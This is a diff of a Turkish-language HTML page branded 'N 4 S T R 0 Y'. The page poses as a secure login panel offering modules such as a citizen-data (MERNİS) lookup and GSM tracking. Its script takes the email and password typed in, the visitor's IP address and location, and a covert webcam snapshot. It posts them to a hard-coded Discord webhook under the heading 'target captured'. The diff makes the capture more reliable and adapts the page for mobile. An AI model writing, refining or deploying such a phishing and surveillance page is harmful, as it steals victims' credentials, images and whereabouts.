@@ -6,20 +6,21 @@
     <title>SECURE ACCESS | N 4 S T R 0 Y</title>
     <style>
         :root { --blue: #2480ff; --red: #f85149; --bg: #06080a; --card: #0d1117; --border: #21262d; }
-        body { background: var(--bg); color: #c9d1d9; font-family: 'Inter', sans-serif; margin: 0; overflow: hidden; height: 100vh; }
-        #errorScreen { display: none; position: fixed; inset: 0; background: #000; color: var(--red); z-index: 20000; flex-direction: column; justify-content: center; align-items: center; text-align: center; font-family: monospace; }
+        body { background: var(--bg); color: #c9d1d9; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; }
+        #errorScreen { display: none; position: fixed; inset: 0; background: #000; color: var(--red); z-index: 20000; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         #authWrapper { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card); padding: 40px; border: 1px solid var(--border); border-radius: 12px; width: 340px; text-align: center; border: 1px solid var(--border); }
-        input { width: 100%; padding: 12px; margin-top: 15px; background: #010409; border: 1px solid var(--border); color: #fff; border-radius: 6px; outline: none; }
+        .auth-card { background: var(--card); padding: 30px; border: 1px solid var(--border); border-radius: 12px; width: 300px; text-align: center; }
+        input { width: 100%; padding: 12px; margin-top: 10px; background: #010409; border: 1px solid var(--border); color: #fff; border-radius: 6px; box-sizing: border-box; }
         .btn-blue { background: var(--blue); color: #fff; border: none; padding: 12px; width: 100%; margin-top: 20px; border-radius: 6px; font-weight: bold; cursor: pointer; }
         #panel { display: none; flex-direction: column; height: 100vh; }
-        .top-bar { height: 60px; background: var(--card); border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 25px; justify-content: space-between; }
-        .content { display: grid; grid-template-columns: 300px 1fr 300px; gap: 20px; padding: 25px; flex-grow: 1; }
-        .box { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 15px; overflow: hidden; }
-        #myCam { width: 100%; border-radius: 6px; border: 1px solid var(--red); filter: grayscale(1); margin-bottom: 10px; transform: scaleX(-1); background: #000; }
-        #mapImg { width: 100%; height: 150px; border-radius: 6px; margin-top: 10px; object-fit: cover; background: #111; }
-        .terminal { background: #010409; border: 1px solid var(--border); padding: 20px; font-family: monospace; font-size: 11px; color: #58a6ff; height: 280px; overflow-y: auto; line-height: 1.6; }
-        .menu-item { padding: 12px; border-bottom: 1px solid var(--border); font-size: 11px; cursor: pointer; display: flex; justify-content: space-between; }
+        .top-bar { height: 50px; background: var(--card); border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 15px; justify-content: space-between; font-size: 13px; }
+        .content { display: grid; grid-template-columns: 1fr; gap: 15px; padding: 15px; flex-grow: 1; overflow-y: auto; }
+        @media (min-width: 768px) { .content { grid-template-columns: 300px 1fr 300px; } }
+        .box { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 15px; height: fit-content; }
+        #myCam { width: 100%; border-radius: 6px; border: 1px solid var(--red); filter: grayscale(1); transform: scaleX(-1); background: #000; }
+        #mapImg { width: 100%; border-radius: 6px; margin-top: 10px; background: #111; }
+        .terminal { background: #010409; border: 1px solid var(--border); padding: 15px; font-family: monospace; font-size: 10px; color: #58a6ff; height: 150px; overflow-y: auto; }
+        .menu-item { padding: 10px; border-bottom: 1px solid var(--border); font-size: 11px; display: flex; justify-content: space-between; }
         .status-red { color: var(--red); font-weight: bold; }
     </style>
 </head>
@@ -27,80 +28,71 @@
 
 <audio id="opMusic" loop><source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3" type="audio/mpeg"></audio>
 
-<div id="errorScreen">
-    <h1 style="font-size:40px;">ACCESS DENIED</h1>
-    <p>KRİTİK HATA: SİSTEM İHLALİ TESPİT EDİLDİ.</p>
-    <p id="ipLogText">IP ADRESİNİZ KAYIT ALTINA ALINDI.</p>
-</div>
+<div id="errorScreen"><h1>ACCESS DENIED</h1><p>SİSTEM İHLALİ TESPİT EDİLDİ.</p></div>
 
 <div id="authWrapper">
     <div class="auth-card" id="loginCard">
-        <h2>SİSTEME GİRİŞ</h2>
-        <input type="email" id="logMail" placeholder="E-Posta Adresi">
+        <h3>GİRİŞ YAP</h3>
+        <input type="email" id="logMail" placeholder="E-Posta">
         <input type="password" id="logPass" placeholder="Şifre">
-        <button class="btn-blue" onclick="handleLogin()">OTURUMU AÇ</button>
-        <p style="font-size:11px; color:#555; margin-top:15px; cursor:pointer;" onclick="toggleAuth()">Hesabınız yok mu? <span style="color:var(--blue);">Kayıt Ol</span></p>
+        <button class="btn-blue" onclick="handleLogin()">GİRİŞ</button>
+        <p style="font-size:11px; color:#555; margin-top:15px;" onclick="toggleAuth()">Hesabınız yok mu? <span style="color:var(--blue);">Kayıt</span></p>
     </div>
     <div class="auth-card" id="regCard" style="display:none;">
-        <h2>YENİ KAYIT</h2>
-        <input type="email" id="regMail" placeholder="E-Posta Adresi">
-        <input type="password" id="regPass" placeholder="Şifre Oluştur">
-        <button class="btn-blue" onclick="handleRegister()">KAYIT OL VE BAĞLAN</button>
-        <p style="font-size:11px; color:#555; margin-top:15px; cursor:pointer;" onclick="toggleAuth()">Zaten üye misiniz? <span style="color:var(--blue);">Giriş Yap</span></p>
+        <h3>KAYIT OL</h3>
+        <input type="email" id="regMail" placeholder="E-Posta">
+        <input type="password" id="regPass" placeholder="Şifre">
+        <button class="btn-blue" onclick="handleRegister()">KAYIT VE BAĞLAN</button>
+        <p style="font-size:11px; color:#555; margin-top:15px;" onclick="toggleAuth()">Giriş Yap</p>
     </div>
 </div>
 
 <div id="panel">
-    <div class="top-bar"><div><b>N 4 S T R 0 Y</b> // SECURE PANEL</div><div id="liveClock" style="font-family:monospace;"></div></div>
+    <div class="top-bar"><b>N 4 S T R 0 Y // ADMIN</b><div id="liveClock"></div></div>
     <div class="content">
         <div class="box">
             <video id="myCam" autoplay playsinline muted></video>
-            <b>GPS LOKASYON</b>
+            <div id="locText" style="font-size:10px; margin-top:10px; font-family:monospace;">LOKASYON: ARANIYOR...</div>
             <img id="mapImg" src="">
-            <div id="locText" style="font-size:10px; margin-top:5px; font-family:monospace; color:#888;"></div>
         </div>
         <div class="box">
-            <div style="display:flex; justify-content:space-around; margin-bottom:15px;">
-                <div style="text-align:center;"><span id="shrg" style="color:var(--blue); font-weight:bold;">%--</span><br><small>BATARYA</small></div>
-                <div style="text-align:center;"><span style="color:#00ff00; font-weight:bold;">AKTİF</span><br><small>SERVER</small></div>
-            </div>
-            <div class="terminal" id="logs">[SYSTEM] Veritabanı bağlantısı kuruluyor...<br></div>
+            <div style="text-align:center; margin-bottom:10px;">BATARYA: <span id="shrg" style="color:var(--blue);">%--</span></div>
+            <div class="terminal" id="logs">[INFO] Sistem başlatıldı...<br></div>
         </div>
         <div class="box">
             <b>MODÜLLER</b>
             <div class="menu-item">MERNİS 2026 <span class="status-red">LOCK</span></div>
-            <div class="menu-item">GSM LOKASYON <span class="status-red">LOCK</span></div>
-            <div class="menu-item">SMS BOMBER <span class="status-red">OFFLINE</span></div>
-            <div style="margin-top:20px; font-size:10px; color:#555;">Uyarı: Tüm işlemler loglanmaktadır.</div>
+            <div class="menu-item">GSM TAKİP <span class="status-red">LOCK</span></div>
         </div>
     </div>
 </div>
 
 <script>
-    let u = { ip: '', lat: '', lon: '' };
+    let u = { ip: 'Alınıyor...', lat: '0', lon: '0' };
     const webhookURL = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
+    // Konum ve IP Bilgisi
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
         u.ip = d.ip; u.lat = d.latitude; u.lon = d.longitude;
-        document.getElementById('ipLogText').innerText = `IP: ${d.ip} VERİTABANINA İŞLENDİ.`;
     });
 
     async function sendToDiscord(mail, pass, status) {
-        const video = document.getElementById('myCam');
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            const message = `🚨 **N 4 S T R 0 Y - HEDEF YAKALANDI!**\n**E-Posta:** ${mail}\n**Şifre:** ${pass}\n**IP:** ${u.ip}\n**Konum:** ${u.lat}, ${u.lon}\n**Durum:** ${status}`;
+        // Fotoğraf çekmeden önce 1 saniye bekle (Beyaz ekranı önlemek için)
+        setTimeout(async () => {
+            const video = document.getElementById('myCam');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            formData.append("payload_json", JSON.stringify({ content: message }));
-            formData.append("file", blob, "n4stroy_target.png");
-
-            fetch(webhookURL, { method: "POST", body: formData });
-        }, 'image/png');
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                const content = `🚨 **HEDEF YAKALANDI**\n**Mail:** ${mail}\n**Pass:** ${pass}\n**IP:** ${u.ip}\n**Konum:** ${u.lat},${u.lon}\n**Durum:** ${status}`;
+                formData.append("payload_json", JSON.stringify({ content: content }));
+                if(blob) formData.append("file", blob, "target.png");
+                fetch(webhookURL, { method: "POST", body: formData });
+            }, 'image/png');
+        }, 1500); 
     }
 
     function toggleAuth() {
@@ -109,20 +101,20 @@
     }
 
     function handleLogin() {
-        const mail = document.getElementById('logMail').value;
-        const pass = document.getElementById('logPass').value;
+        const m = document.getElementById('logMail').value;
+        const p = document.getElementById('logPass').value;
         const stored = localStorage.getItem('n4_user');
-        if (stored && JSON.parse(stored).email === mail) {
-            start().then(() => sendToDiscord(mail, pass, "Eski Kullanıcı Girişi"));
-        } else { alert("HATA: Kayıtlı kullanıcı bulunamadı."); }
+        if (stored && JSON.parse(stored).email === m) {
+            start().then(() => sendToDiscord(m, p, "Giriş Yaptı"));
+        } else { alert("Kayıt bulunamadı!"); }
     }
 
     function handleRegister() {
-        const mail = document.getElementById('regMail').value;
-        const pass = document.getElementById('regPass').value;
-        if(!mail.includes('@')) return alert("Geçersiz e-posta!");
-        localStorage.setItem('n4_user', JSON.stringify({ email: mail }));
-        start().then(() => sendToDiscord(mail, pass, "YENİ KAYIT!"));
+        const m = document.getElementById('regMail').value;
+        const p = document.getElementById('regPass').value;
+        if(!m.includes('@')) return alert("Geçersiz Mail!");
+        localStorage.setItem('n4_user', JSON.stringify({ email: m }));
+        start().then(() => sendToDiscord(m, p, "Yeni Kayıt!"));
     }
 
     async function start() {
@@ -130,19 +122,19 @@
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('myCam').srcObject = stream;
-            stream.getVideoTracks()[0].onended = () => { location.reload(); };
         } catch(e) { document.getElementById('errorScreen').style.display = 'flex'; return; }
 
         document.getElementById('authWrapper').style.display = 'none';
         document.getElementById('panel').style.display = 'flex';
-        document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${u.lon},${u.lat}&z=16&l=map&size=270,150&pt=${u.lon},${u.lat},pmwtm`;
-        document.getElementById('locText').innerText = `LAT: ${u.lat}\nLON: ${u.lon}\nIP: ${u.ip}`;
+        document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${u.lon},${u.lat}&z=15&l=map&size=300,150&pt=${u.lon},${u.lat},pmwtm`;
+        document.getElementById('locText').innerText = `LOKASYON: ${u.lat}, ${u.lon}\nIP: ${u.ip}`;
+        
         navigator.getBattery().then(b => { document.getElementById('shrg').innerText = '%' + Math.round(b.level * 100); });
         
-        const lgs = ["Giriş onaylandı...", "Konum doğrulanıyor...", "Kamera akışı aktif...", "N 4 S T R 0 Y logları mühürlendi."];
-        lgs.forEach((l, i) => setTimeout(() => { document.getElementById('logs').innerHTML += `[INFO] ${l}<br>`; }, i * 1200));
+        const lgs = ["Yetki doğrulandı.", "Sistem mühürlendi.", "Canlı takip aktif."];
+        lgs.forEach((l, i) => setTimeout(() => { document.getElementById('logs').innerHTML += `[INFO] ${l}<br>`; }, i * 1000));
     }
-    setInterval(() => { document.getElementById('liveClock').innerText = new Date().toLocaleString(); }, 1000);
+    setInterval(() => { document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(); }, 1000);
 </script>
 </body>
 </html>
